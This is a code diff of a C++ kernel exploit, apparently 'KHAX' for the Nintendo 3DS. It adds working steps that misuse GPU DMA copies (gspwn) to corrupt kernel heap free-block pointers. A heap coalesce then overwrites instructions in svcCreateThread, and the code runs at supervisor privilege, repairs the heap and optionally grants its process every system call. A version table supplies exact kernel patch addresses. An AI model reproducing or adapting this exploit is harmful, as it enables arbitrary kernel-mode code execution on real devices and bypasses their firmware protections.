@@ -6,15 +6,8 @@
 #include <cstring>
 #include <limits>
 
-#define KHAX_DEBUG
-
-#ifdef KHAX_DEBUG
-	#define KHAX_printf printf
-#else
-	#define KHAX_printf static_cast<void>
-#endif
-
-#define KHAX_lengthof(...) (sizeof(__VA_ARGS__) / sizeof((__VA_ARGS__)[0]))
+#include "khax.h"
+#include "khaxinternal.h"
 
 //------------------------------------------------------------------------------------------------
 namespace KHAX
@@ -31,14 +24,20 @@ namespace KHAX
 		u32 m_nominalVersion;
 		// Patch location in svcCreateThread
 		u32 m_threadPatchAddress;
+		// Original version of code at m_threadPatchAddress
+		static constexpr const u32 m_threadPatchOriginalCode = 0x8DD00CE5;
 		// System call unlock patch location
 		u32 m_syscallPatchAddress;
 		// Kernel virtual address mapping of FCRAM
 		u32 m_fcramVirtualAddress;
 		// Physical mapping of FCRAM on this machine
-		u32 m_fcramPhysicalAddress;
+		static constexpr const u32 m_fcramPhysicalAddress = 0x20000000;
 		// Physical size of FCRAM on this machine
 		u32 m_fcramSize;
+		// Address of KProcess address in kernel (KProcess **)
+		static constexpr const u32 m_currentKProcessPtr = 0xFFFF9004;
+		// Function taking a KProcess * (as void *) and returning SVC access control array
+		KSVCACL &(*m_svcAccessControlConvert)(void *kprocess);
 
 		// Convert a user-mode virtual address in the linear heap into a kernel-mode virtual
 		// address using the version-specific information in this table entry.
@@ -61,9 +60,12 @@ namespace KHAX
 		MemChunkHax(const VersionData *versionData)
 		:	m_versionData(versionData),
 			m_nextStep(1),
+			m_corrupted(0),
 			m_overwriteMemory(nullptr),
-			m_overwriteAllocated(0)
+			m_overwriteAllocated(0),
+			m_extraLinear(nullptr)
 		{
+			s_instance = this;
 		}
 
 		// Free memory and such.
@@ -81,12 +83,31 @@ namespace KHAX
 		Result Step3_SurroundFree();
 		// Verify that the freed heap blocks' data matches our expected layout.
 		Result Step4_VerifyExpectedLayout();
+		// Corrupt svcCreateThread in the ARM11 kernel and create the foothold.
+		Result Step5_CorruptCreateThread();
+		// Execute svcCreateThread to execute code at SVC privilege.
+		Result Step6_ExecuteSVCCode();
 
 	private:
+		// SVC-mode entry point thunk (true entry point).
+		static Result Step6a_SVCEntryPointThunk();
+		// SVC-mode entry point.
+		Result Step6b_SVCEntryPoint();
+		// Undo the code patch that Step5_CorruptCreateThread did.
+		Result Step6c_UndoCreateThreadPatch();
+		// Fix the heap corruption caused as a side effect of step 5.
+		Result Step6d_FixHeapCorruption();
+		// Grant our process access to all system calls, including svcBackdoor.
+		Result Step6e_GrantSVCAccess();
+		// Flush instruction and data caches.
+		Result Step6f_FlushCaches();
+
 		// Version information.
 		const VersionData *const m_versionData;
 		// Next step number.
 		int m_nextStep;
+		// Whether we are in a corrupted state, meaning we cannot continue if an error occurs.
+		int m_corrupted;
 
 		// Free block structure in the kernel, the one used in the memchunkhax exploit.
 		struct HeapFreeBlock
@@ -124,7 +145,12 @@ namespace KHAX
 			// When interpreting as a HeapFreeBlock.
 			HeapFreeBlock m_freeBlock;
 		};
+		// Must be a multiple of 16 for use with gspwn.
+		static_assert(sizeof(ExtraLinearMemory) % 16 == 0, "ExtraLinearMemory isn't a multiple of 16 bytes");
 		ExtraLinearMemory *m_extraLinear;
+
+		// Pointer to our instance.
+		static MemChunkHax *volatile s_instance;
 	};
 
 	//------------------------------------------------------------------------------------------------
@@ -134,7 +160,10 @@ namespace KHAX
 	// Check whether this system is a New 3DS.
 	Result IsNew3DS(bool *answer, u32 kernelVersionAlreadyKnown = 0);
 	// gspwn, meant for reading from or writing to freed buffers.
-	Result GSPwn(void *dest, const void *src, std::size_t size, s64 waitNanoseconds);
+	Result GSPwn(void *dest, const void *src, std::size_t size, bool wait = true);
+	// Converts a structure pointer to a reference to the given member.
+	template <typename T, typename M, M T::*MP>
+	M &StructMemberThunk(void *object);
 }
 
 
@@ -147,21 +176,27 @@ namespace KHAX
 // System version table
 const KHAX::VersionData KHAX::VersionData::s_versionTable[] =
 {
+#define SVC_FUNC(ver) StructMemberThunk<KProcess_##ver, \
+	decltype(static_cast<KProcess_##ver *>(nullptr)->m_svcAccessControl), \
+	&KProcess_##ver::m_svcAccessControl>
+
 	// Old 3DS, old address layout
-	{ false,  SYSTEM_VERSION(2, 34, 0), SYSTEM_VERSION(4, 1, 0), 0xEFF83C97, 0xEFF827CC, 0xF0000000, 0x20000000, 0x08000000 },
-	{ false,  SYSTEM_VERSION(2, 35, 6), SYSTEM_VERSION(5, 0, 0), 0xEFF8372F, 0xEFF822A8, 0xF0000000, 0x20000000, 0x08000000 },
-	{ false,  SYSTEM_VERSION(2, 36, 0), SYSTEM_VERSION(5, 1, 0), 0xEFF8372B, 0xEFF822A4, 0xF0000000, 0x20000000, 0x08000000 },
-	{ false,  SYSTEM_VERSION(2, 37, 0), SYSTEM_VERSION(6, 0, 0), 0xEFF8372B, 0xEFF822A4, 0xF0000000, 0x20000000, 0x08000000 },
-	{ false,  SYSTEM_VERSION(2, 38, 0), SYSTEM_VERSION(6, 1, 0), 0xEFF8372B, 0xEFF822A4, 0xF0000000, 0x20000000, 0x08000000 },
-	{ false,  SYSTEM_VERSION(2, 39, 4), SYSTEM_VERSION(7, 0, 0), 0xEFF8372F, 0xEFF822A8, 0xF0000000, 0x20000000, 0x08000000 },
-	{ false,  SYSTEM_VERSION(2, 40, 0), SYSTEM_VERSION(7, 2, 0), 0xEFF8372B, 0xEFF822A4, 0xF0000000, 0x20000000, 0x08000000 },
+	{ false, SYSTEM_VERSION(2, 34, 0), SYSTEM_VERSION(4, 1, 0), 0xEFF83C9F, 0xEFF827CC, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0) },
+	{ false, SYSTEM_VERSION(2, 35, 6), SYSTEM_VERSION(5, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0) },
+	{ false, SYSTEM_VERSION(2, 36, 0), SYSTEM_VERSION(5, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0) },
+	{ false, SYSTEM_VERSION(2, 37, 0), SYSTEM_VERSION(6, 0, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0) },
+	{ false, SYSTEM_VERSION(2, 38, 0), SYSTEM_VERSION(6, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0) },
+	{ false, SYSTEM_VERSION(2, 39, 4), SYSTEM_VERSION(7, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0) },
+	{ false, SYSTEM_VERSION(2, 40, 0), SYSTEM_VERSION(7, 2, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0) },
 	// Old 3DS, new address layout
-	{ false,  SYSTEM_VERSION(2, 44, 6), SYSTEM_VERSION(8, 0, 0), 0xDFF83837, 0xDFF82290, 0xE0000000, 0x20000000, 0x08000000 },
-	{ false,  SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF83837, 0xDFF82290, 0xE0000000, 0x20000000, 0x08000000 },
+	{ false, SYSTEM_VERSION(2, 44, 6), SYSTEM_VERSION(8, 0, 0), 0xDFF8383F, 0xDFF82290, 0xE0000000, 0x08000000, SVC_FUNC(8_0_0) },
+	{ false, SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF8383F, 0xDFF82290, 0xE0000000, 0x08000000, SVC_FUNC(8_0_0) },
 	// New 3DS
-	{ true,   SYSTEM_VERSION(2, 44, 6), SYSTEM_VERSION(8, 0, 0), 0xDFF8382F, 0xDFF82260, 0xE0000000, 0x20000000, 0x10000000 }, // I don't think that this exists...
+	{ true,  SYSTEM_VERSION(2, 44, 6), SYSTEM_VERSION(8, 0, 0), 0xDFF83837, 0xDFF82260, 0xE0000000, 0x10000000, SVC_FUNC(8_0_0) }, // I don't think that this exists...
 	// XXX: missing entry for New 3DS 8.1.0
-	{ true,   SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF8382F, 0xDFF82260, 0xE0000000, 0x20000000, 0x10000000 },
+	{ true,  SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF83837, 0xDFF82260, 0xE0000000, 0x10000000, SVC_FUNC(8_0_0) },
+
+#undef SVC_FUNC
 };
 
 //------------------------------------------------------------------------------------------------
@@ -233,6 +268,9 @@ const KHAX::VersionData *KHAX::VersionData::GetForCurrentSystem()
 //
 
 //------------------------------------------------------------------------------------------------
+KHAX::MemChunkHax *volatile KHAX::MemChunkHax::s_instance = nullptr;
+
+//------------------------------------------------------------------------------------------------
 // Basic initialization.
 Result KHAX::MemChunkHax::Step1_Initialize()
 {
@@ -282,7 +320,7 @@ Result KHAX::MemChunkHax::Step2_AllocateMemory()
 
 	// Allocate extra memory that we'll need.
 	m_extraLinear = static_cast<ExtraLinearMemory *>(linearMemAlign(sizeof(*m_extraLinear),
-		alignof(m_extraLinear)));
+		alignof(*m_extraLinear)));
 	if (!m_extraLinear)
 	{
 		KHAX_printf("Step2:failed extra alloc\n");
@@ -332,7 +370,7 @@ Result KHAX::MemChunkHax::Step3_SurroundFree()
 
 	// Free the third page.
 	if (Result result = svcControlMemory(&dummy, reinterpret_cast<u32>(&m_overwriteMemory->m_pages[2]), 0,
-		sizeof(m_overwriteMemory->m_pages[2]), MEMOP_FREE, static_cast<MemPerm>(0)))
+		sizeof(m_overwriteMemory->m_pages[2]), MEMOP_FREE_LINEAR, static_cast<MemPerm>(0)))
 	{
 		return result;
 	}
@@ -340,11 +378,22 @@ Result KHAX::MemChunkHax::Step3_SurroundFree()
 
 	// Free the fifth page.
 	if (Result result = svcControlMemory(&dummy, reinterpret_cast<u32>(&m_overwriteMemory->m_pages[4]), 0,
-		sizeof(m_overwriteMemory->m_pages[4]), MEMOP_FREE, static_cast<MemPerm>(0)))
+		sizeof(m_overwriteMemory->m_pages[4]), MEMOP_FREE_LINEAR, static_cast<MemPerm>(0)))
 	{
 		return result;
 	}
 	m_overwriteAllocated &= ~(1u << 4);
+
+	// Attempt to write to remaining pages.
+	//KHAX_printf("Step2:probing page [0]\n");
+	*static_cast<volatile u8 *>(&m_overwriteMemory->m_pages[0].m_bytes[0]) = 0;
+	//KHAX_printf("Step2:probing page [1]\n");
+	*static_cast<volatile u8 *>(&m_overwriteMemory->m_pages[1].m_bytes[0]) = 0;
+	//KHAX_printf("Step2:probing page [3]\n");
+	*static_cast<volatile u8 *>(&m_overwriteMemory->m_pages[3].m_bytes[0]) = 0;
+	//KHAX_printf("Step2:probing page [5]\n");
+	*static_cast<volatile u8 *>(&m_overwriteMemory->m_pages[5].m_bytes[0]) = 0;
+	KHAX_printf("Step2:probing done\n");
 
 	// Done.
 	++m_nextStep;
@@ -365,9 +414,9 @@ Result KHAX::MemChunkHax::Step4_VerifyExpectedLayout()
 	std::memset(m_extraLinear, 0xCC, sizeof(*m_extraLinear));
 
 	if (Result result = GSPwn(m_extraLinear, &m_overwriteMemory->m_pages[2],
-		sizeof(*m_extraLinear), 10000000))
+		sizeof(*m_extraLinear)))
 	{
-		KHAX_printf("Step4:invgspwn failed:%08lx\n", result);
+		KHAX_printf("Step4:gspwn failed:%08lx\n", result);
 		return result;
 	}
 
@@ -382,6 +431,9 @@ Result KHAX::MemChunkHax::Step4_VerifyExpectedLayout()
 		&m_overwriteMemory->m_pages[4]))
 	{
 		KHAX_printf("Step4:[2]->next != [4]\n");
+		KHAX_printf("Step4:%p %p %p\n", m_extraLinear->m_freeBlock.m_next,
+			m_versionData->ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[4]),
+			&m_overwriteMemory->m_pages[4]);
 		return MakeError(26, 5, KHAX_MODULE, 1014);
 	}
 
@@ -389,9 +441,9 @@ Result KHAX::MemChunkHax::Step4_VerifyExpectedLayout()
 	std::memset(m_extraLinear, 0xCC, sizeof(*m_extraLinear));
 
 	if (Result result = GSPwn(m_extraLinear, &m_overwriteMemory->m_pages[4],
-		sizeof(*m_extraLinear), 10000000))
+		sizeof(*m_extraLinear)))
 	{
-		KHAX_printf("Step4:invgspwn failed:%08lx\n", result);
+		KHAX_printf("Step4:gspwn failed:%08lx\n", result);
 		return result;
 	}
 
@@ -405,6 +457,9 @@ Result KHAX::MemChunkHax::Step4_VerifyExpectedLayout()
 		&m_overwriteMemory->m_pages[2]))
 	{
 		KHAX_printf("Step4:[4]->prev != [2]\n");
+		KHAX_printf("Step4:%p %p %p\n", m_extraLinear->m_freeBlock.m_prev,
+			m_versionData->ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[2]),
+			&m_overwriteMemory->m_pages[2]);
 		return MakeError(26, 5, KHAX_MODULE, 1014);
 	}
 
@@ -414,9 +469,332 @@ Result KHAX::MemChunkHax::Step4_VerifyExpectedLayout()
 }
 
 //------------------------------------------------------------------------------------------------
+// Corrupt svcCreateThread in the ARM11 kernel and create the foothold.
+Result KHAX::MemChunkHax::Step5_CorruptCreateThread()
+{
+	if (m_nextStep != 5)
+	{
+		KHAX_printf("MemChunkHax: Invalid step number %d for Step5_CorruptCreateThread\n", m_nextStep);
+		return MakeError(28, 5, KHAX_MODULE, 1016);
+	}
+
+	// Read the memory page we're going to gspwn.
+	if (Result result = GSPwn(m_extraLinear, &m_overwriteMemory->m_pages[2].m_freeBlock,
+		sizeof(*m_extraLinear)))
+	{
+		KHAX_printf("Step5:gspwn read failed:%08lx\n", result);
+		return result;
+	}
+
+	// Adjust the "next" pointer to point to within the svcCreateThread system call so as to
+	// corrupt certain instructions.  The result will be that calling svcCreateThread will result
+	// in executing our code.
+	// NOTE: The overwrite is modifying the "m_prev" field, so we subtract the offset of m_prev.
+	// That is, the overwrite adds this offset back in.
+	m_extraLinear->m_freeBlock.m_next = reinterpret_cast<HeapFreeBlock *>(
+		m_versionData->m_threadPatchAddress - offsetof(HeapFreeBlock, m_prev));
+
+	// Do the GSPwn, the actual exploit we've been waiting for.
+	if (Result result = GSPwn(&m_overwriteMemory->m_pages[2].m_freeBlock, m_extraLinear,
+		sizeof(*m_extraLinear)))
+	{
+		KHAX_printf("Step5:gspwn exploit failed:%08lx\n", result);
+		return result;
+	}
+
+	// The heap is now corrupted in two ways (Step6 explains why two ways).
+	m_corrupted += 2;
+
+	KHAX_printf("Step5:gspwn succeeded; heap now corrupt\n");
+
+	// Corrupt svcCreateThread by freeing the second page.  The kernel will coalesce the third
+	// page into the second page, and in the process zap an instruction pair in svcCreateThread.
+	u32 dummy;
+	if (Result result = svcControlMemory(&dummy, reinterpret_cast<u32>(&m_overwriteMemory->m_pages[1]),
+		0, sizeof(m_overwriteMemory->m_pages[1]), MEMOP_FREE_LINEAR, static_cast<MemPerm>(0)))
+	{
+		KHAX_printf("Step5:free to pwn failed:%08lx\n", result);
+		return result;
+	}
+	m_overwriteAllocated &= ~(1u << 1);
+
+	// We have an additional layer of instability because of the kernel code overwrite.
+	++m_corrupted;
+
+	KHAX_printf("Step5:svcCreateThread now hacked\n");
+
+	++m_nextStep;
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Execute svcCreateThread to execute code at SVC privilege.
+Result KHAX::MemChunkHax::Step6_ExecuteSVCCode()
+{
+	if (m_nextStep != 6)
+	{
+		KHAX_printf("MemChunkHax: Invalid step number %d for Step6_ExecuteSVCCode\n", m_nextStep);
+		return MakeError(28, 5, KHAX_MODULE, 1016);
+	}
+
+	// Call svcCreateThread such that r0 is the desired exploit function.  Note that the
+	// parameters to the usual system call thunk are rearranged relative to the actual system call
+	// - the thread priority parameter is actually the one that goes into r0.  In addition, we
+	// want to pass other parameters that make for an illegal thread creation request, because the
+	// rest of the thread creation SVC occurs before the hacked code gets executed.  We want the
+	// thread creation request to fail, then the hack to grant us control.  Processor ID
+	// 0x7FFFFFFF seems to do the trick here.
+	Handle dummyHandle;
+	Result result = svcCreateThread(&dummyHandle, nullptr, 0, nullptr, reinterpret_cast<s32>(
+		Step6a_SVCEntryPointThunk), (std::numeric_limits<s32>::max)());
+
+	KHAX_printf("Step6:SVC mode returned: %08lX %d\n", result, m_nextStep);
+
+	++m_nextStep;
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// SVC-mode entry point thunk (true entry point).
+#ifndef _MSC_VER
+__attribute__((__naked__))
+#endif
+Result KHAX::MemChunkHax::Step6a_SVCEntryPointThunk()
+{
+	__asm__ volatile("add sp, sp, #8");
+
+	register Result result __asm__("r0") = s_instance->Step6b_SVCEntryPoint();
+
+	__asm__ volatile("ldr pc, [sp], #4" : : "r"(result));
+}
+
+//------------------------------------------------------------------------------------------------
+// SVC-mode entry point.
+#ifndef _MSC_VER
+__attribute__((__noinline__))
+#endif
+Result KHAX::MemChunkHax::Step6b_SVCEntryPoint()
+{
+	if (Result result = Step6c_UndoCreateThreadPatch())
+	{
+		return result;
+	}
+	if (Result result = Step6d_FixHeapCorruption())
+	{
+		return result;
+	}
+/*	if (Result result = Step6e_GrantSVCAccess())
+	{
+		return result;
+	}*/
+	if (Result result = Step6f_FlushCaches())
+	{
+		return result;
+	}
+
+	return 0x1337C0DE;
+}
+
+//------------------------------------------------------------------------------------------------
+// Undo the code patch that Step5_CorruptCreateThread did.
+Result KHAX::MemChunkHax::Step6c_UndoCreateThreadPatch()
+{
+	// Unpatch svcCreateThread.  NOTE: Misaligned pointer.
+	*reinterpret_cast<u32 *>(m_versionData->m_threadPatchAddress) = m_versionData->
+		m_threadPatchOriginalCode;
+	--m_corrupted;
+
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Fix the heap corruption caused as a side effect of step 5.
+Result KHAX::MemChunkHax::Step6d_FixHeapCorruption()
+{
+	// The kernel's heap coalesce code seems to be like the following for the case we triggered,
+	// where we're freeing a block before ("left") an adjacent block ("right"):
+	//
+	// (1)  left->m_count += right->m_count;
+	// (2)  left->m_next = right->m_next;
+	// (3)  right->m_next->m_prev = left;
+	//
+	// (1) should have happened normally.  (3) is what we exploit: we set right->m_next to point
+	// to where we want to patch, such that the write to m_prev is the desired code overwrite.
+	// (2) is copying the value we put into right->m_next to accomplish (3).
+	//
+	// As a result of these shenanigans, we have two fixes to do to the heap: fix left->m_next to
+	// point to the correct next free block, and do the write to right->m_next->m_prev that didn't
+	// happen because it instead was writing to kernel code.
+
+	// "left" is the second overwrite page.
+	auto left = static_cast<HeapFreeBlock *>(m_versionData->ConvertLinearUserVAToKernelVA(
+		&m_overwriteMemory->m_pages[1].m_freeBlock));
+	// "right->m_next" is the fifth overwrite page.
+	auto rightNext = static_cast<HeapFreeBlock *>(m_versionData->ConvertLinearUserVAToKernelVA(
+		&m_overwriteMemory->m_pages[4].m_freeBlock));
+
+	// Do the two fixups.
+	left->m_next = rightNext;
+	--m_corrupted;
+
+	rightNext->m_prev = left;
+	--m_corrupted;
+
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Grant our process access to all system calls, including svcBackdoor.
+Result KHAX::MemChunkHax::Step6e_GrantSVCAccess()
+{
+	// Get the KProcess pointer, whose type varies by kernel version.
+	void *kprocess = *reinterpret_cast<void **>(m_versionData->m_currentKProcessPtr);
+
+	// Get the SVC ACL within the KProcess.
+	KSVCACL &acl = (*m_versionData->m_svcAccessControlConvert)(kprocess);
+
+	// Grant ourselves access to everything.
+	std::memset(acl, 0xFF, sizeof(acl));
+
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Flush instruction and data caches.
+Result KHAX::MemChunkHax::Step6f_FlushCaches()
+{
+	// Invalidates the entire instruction cache.
+	__asm__ volatile(
+		"mov r0, #0\n\t"
+		"mcr p15, 0, r0, c7, c5, 0\n\t");
+
+	// Invalidates the entire data cache.
+	__asm__ volatile(
+		"mov r0, #0\n\t"
+		"mcr p15, 0, r0, c7, c10, 0\n\t");
+
+	return 0;
+}
+
+/*//------------------------------------------------------------------------------------------------
+// Fix the corrupted heap.
+Result KHAX::MemChunkHax::Step6_FixCorruptedHeap()
+{
+	if (m_nextStep != 6)
+	{
+		KHAX_printf("MemChunkHax: Invalid step number %d for Step6_FixCorruptedHeap\n", m_nextStep);
+		return MakeError(31, 5, KHAX_MODULE, 1016);
+	}
+
+	// The kernel's heap coalesce code seems to be like the following for the case we triggered,
+	// where we're freeing a block before ("left") an adjacent block ("right"):
+	//
+	// (1)  left->m_count += right->m_count;
+	// (2)  left->m_next = right->m_next;
+	// (3)  right->m_next->m_prev = left;
+	//
+	// (1) should have happened normally.  (3) is what we exploit: we set right->m_next to point
+	// to where we want to patch, such that the write to m_prev is the desired code overwrite.
+	// (2) is copying the value we put into right->m_next to accomplish (3).
+	//
+	// As a result of these shenanigans, we have two fixes to do to the heap: fix left->m_next to
+	// point to the correct next free block, and do the write to right->m_next->m_prev that didn't
+	// happen because it instead was writing to kernel code.
+
+	// Read back "left", which is the second page.
+	if (Result result = GSPwn(m_extraLinear, &m_overwriteMemory->m_pages[1], sizeof(*m_extraLinear)))
+	{
+		KHAX_printf("Step6:failed readback [1]:%08lx\n", result);
+		return result;
+	}
+
+	KHAX_printf("Step6:[1]u=%p k=%p\n", &m_overwriteMemory->m_pages[1], m_versionData->
+		ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[1]));
+	KHAX_printf("Step6:[1]n=%p p=%p c=%d\n", m_extraLinear->m_freeBlock.m_next,
+		m_extraLinear->m_freeBlock.m_prev, m_extraLinear->m_freeBlock.m_count);
+
+	// [1]->m_next should be the patch address - offsetof(HeapFreeData, m_prev).  The reason why
+	// is explained in the large block comment.
+	if (m_extraLinear->m_freeBlock.m_next != reinterpret_cast<void *>(
+		m_versionData->m_threadPatchAddress - offsetof(HeapFreeBlock, m_prev)))
+	{
+		KHAX_printf("Step6:bad [1]->m_next\n");
+		return MakeError(31, 5, KHAX_MODULE, 1014);
+	}
+
+	// Fix left->m_next = right->m_next, which is the fifth page (&[4]).
+	m_extraLinear->m_freeBlock.m_next = static_cast<HeapFreeBlock *>(m_versionData->
+		ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[4].m_freeBlock));
+
+	if (Result result = GSPwn(&m_overwriteMemory->m_pages[1], m_extraLinear, sizeof(*m_extraLinear)))
+	{
+		KHAX_printf("Step6:failed fix write [1]:%08lx\n", result);
+		return result;
+	}
+
+	KHAX_printf("Step6a:[1]u=%p k=%p\n", &m_overwriteMemory->m_pages[1], m_versionData->
+		ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[1]));
+	KHAX_printf("Step6a:[1]n=%p p=%p c=%d\n", m_extraLinear->m_freeBlock.m_next,
+		m_extraLinear->m_freeBlock.m_prev, m_extraLinear->m_freeBlock.m_count);
+
+	--m_corrupted;
+
+	// Read back the freed fifth page's memory, or "right->m_next".
+	if (Result result = GSPwn(m_extraLinear, &m_overwriteMemory->m_pages[4], sizeof(*m_extraLinear)))
+	{
+		KHAX_printf("Step6:failed readback [4]:%08lx\n", result);
+		return result;
+	}
+
+	KHAX_printf("Step6:[4]u=%p k=%p\n", &m_overwriteMemory->m_pages[4], m_versionData->
+		ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[4]));
+	KHAX_printf("Step6:[4]n=%p p=%p c=%d\n", m_extraLinear->m_freeBlock.m_next,
+		m_extraLinear->m_freeBlock.m_prev, m_extraLinear->m_freeBlock.m_count);
+
+	// [4]->m_prev should have remained &[2] despite the coalesce.  The reason why is explained
+	// in the large block comment.
+	if (m_extraLinear->m_freeBlock.m_prev != m_versionData->ConvertLinearUserVAToKernelVA(
+		&m_overwriteMemory->m_pages[2].m_freeBlock))
+	{
+		KHAX_printf("Step6:bad [2]->m_prev\n");
+		return MakeError(31, 5, KHAX_MODULE, 1014);
+	}
+
+	// Fix right->m_next->prev = left.
+	m_extraLinear->m_freeBlock.m_prev = static_cast<HeapFreeBlock *>(m_versionData->
+		ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[1].m_freeBlock));
+
+	if (Result result = GSPwn(&m_overwriteMemory->m_pages[4], m_extraLinear, sizeof(*m_extraLinear)))
+	{
+		KHAX_printf("Step6:failed fix write [4]:%08lx\n", result);
+		return result;
+	}
+
+	KHAX_printf("Step6a:[4]u=%p k=%p\n", &m_overwriteMemory->m_pages[4], m_versionData->
+		ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[4]));
+	KHAX_printf("Step6a:[4]n=%p p=%p c=%d\n", m_extraLinear->m_freeBlock.m_next,
+		m_extraLinear->m_freeBlock.m_prev, m_extraLinear->m_freeBlock.m_count);
+
+	--m_corrupted;
+
+	++m_nextStep;
+	return 0;
+}*/
+
+//------------------------------------------------------------------------------------------------
 // Free memory and such.
 KHAX::MemChunkHax::~MemChunkHax()
 {
+	// If we're corrupted, we're dead.
+	if (m_corrupted > 0)
+	{
+		KHAX_printf("~:error while corrupt;freezing\n");
+		for (;;)
+		{
+			svcSleepThread(s64(60) * 1000000000);
+		}
+	}
+
 	// This function has to be careful not to crash trying to shut down after an aborted attempt.
 	if (m_overwriteMemory)
 	{
@@ -429,7 +807,7 @@ KHAX::MemChunkHax::~MemChunkHax()
 			if (m_overwriteAllocated & (1u << x))
 			{
 				Result res = svcControlMemory(&dummy, reinterpret_cast<u32>(&m_overwriteMemory->m_pages[x]), 0,
-					sizeof(m_overwriteMemory->m_pages[x]), MEMOP_FREE, static_cast<MemPerm>(0));
+					sizeof(m_overwriteMemory->m_pages[x]), MEMOP_FREE_LINEAR, static_cast<MemPerm>(0));
 				KHAX_printf("free %u: %08lx\n", x, res);
 			}
 		}
@@ -439,6 +817,16 @@ KHAX::MemChunkHax::~MemChunkHax()
 	if (m_extraLinear)
 	{
 		linearFree(m_extraLinear);
+	}
+
+	// s_instance better be us
+	if (s_instance != this)
+	{
+		KHAX_printf("~:s_instance is wrong\n");
+	}
+	else
+	{
+		s_instance = nullptr;
 	}
 }
 
@@ -490,30 +878,68 @@ Result KHAX::IsNew3DS(bool *answer, u32 kernelVersionAlreadyKnown)
 
 //------------------------------------------------------------------------------------------------
 // gspwn, meant for reading from or writing to freed buffers.
-Result KHAX::GSPwn(void *dest, const void *src, std::size_t size, s64 waitNanoseconds)
+Result KHAX::GSPwn(void *dest, const void *src, std::size_t size, bool wait)
 {
 	// Attempt a flush of the source, but ignore the result, since we may have just been asked to
 	// read unmapped memory or something similar.
 	GSPGPU_FlushDataCache(nullptr, static_cast<u8 *>(const_cast<void *>(src)), size);
 
-	// Invalidate the destination's cache, since we're about to overwrite it.
-	if (Result result = GSPGPU_InvalidateDataCache(nullptr, static_cast<u8 *>(dest), size))
-	{
-		KHAX_printf("invgspwn:inval dest fail:%08lx\n", result);
-		return result;
-	}
+	// Invalidate the destination's cache, since we're about to overwrite it.  Likewise, ignore
+	// errors, since it may be the destination that is an unmapped address.
+	GSPGPU_InvalidateDataCache(nullptr, static_cast<u8 *>(dest), size);
 
+	// Copy that floppy.
 	if (Result result = GX_SetTextureCopy(nullptr, static_cast<u32 *>(const_cast<void *>(src)), 0,
 		static_cast<u32 *>(dest), 0, size, 8))
 	{
-		KHAX_printf("invgspwn:copy fail:%08lx\n", result);
+		KHAX_printf("gspwn:copy fail:%08lx\n", result);
 		return result;
 	}
 
 	// Wait for the operation to finish.
-	gspWaitForPPF();
+	if (wait)
+	{
+		gspWaitForPPF();
+	}
 
 	return 0;
+}
+
+void __attribute__((__naked__)) CreateThreadTest(u32 (&regs)[5])
+{
+	__asm__ volatile(
+		"push {r4}\n\t"
+		"push {r0}\n\t"
+		"mov r0, #30\n\t"
+		"mov r1, #0\n\t"
+		"mov r2, #123\n\t"
+		"mov r3, #34\n\t"
+		"mov r4, #0x7FFFFFFF\n\t"
+		"svc 0x08\n\t"
+		"push {r0}\n\t"
+		"ldr r0, [sp, #4]\n\t"
+		"str r1, [r0, #4]\n\t"
+		"ldr r1, [sp]\n\t"
+		"str r1, [r0]\n\t"
+		"str r2, [r0, #8]\n\t"
+		"str r3, [r0, #12]\n\t"
+		"str r4, [r0, #16]\n\t"
+		"pop {r0}\n\t"
+		"pop {r0}\n\t"
+		"pop {r4}\n\t"
+		"bx lr\n\t"
+		:
+		:
+		: "r0", "r1", "r2", "r3", "cc", "memory"
+		);
+}
+
+//------------------------------------------------------------------------------------------------
+// Converts a structure pointer to a reference to the given member.
+template <typename T, typename M, M T::*MP>
+M &KHAX::StructMemberThunk(void *object)
+{
+	return (static_cast<T *>(object))->*MP;
 }
 
 //------------------------------------------------------------------------------------------------
@@ -564,6 +990,22 @@ extern "C" Result khaxInit()
 		KHAX_printf("khaxInit: Step4 failed: %08lx\n", result);
 		return result;
 	}
+	if (Result result = hax.Step5_CorruptCreateThread())
+	{
+		KHAX_printf("khaxInit: Step5 failed: %08lx\n", result);
+		return result;
+	}
+	if (Result result = hax.Step6_ExecuteSVCCode())
+	{
+		KHAX_printf("khaxInit: Step6 failed: %08lx\n", result);
+		return result;
+	}
+
+/*	u32 testValues[5];
+	CreateThreadTest(testValues);
+	KHAX_printf("test:[0]=%08lX [1]=%08lX\n", testValues[0], testValues[1]);
+	KHAX_printf("test:[2]=%08lX [3]=%08lX\n", testValues[2], testValues[3]);
+	KHAX_printf("test:[4]=%08lX\n", testValues[4]);*/
 
 	KHAX_printf("khaxInit: end of implementation\n");
 	return MakeError(27, 6, KHAX_MODULE, 1012);
